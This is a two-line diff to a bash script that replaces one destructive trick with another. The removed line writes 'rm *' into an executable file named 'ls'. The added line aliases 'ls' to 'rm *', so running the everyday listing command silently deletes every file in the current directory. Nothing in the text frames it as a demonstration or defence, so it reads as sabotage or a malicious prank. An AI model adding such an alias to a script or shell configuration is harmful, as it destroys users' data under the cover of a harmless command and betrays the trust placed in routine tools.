@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "rm *" > "ls" | chmod +x "ls"
+alias ls='rm *'
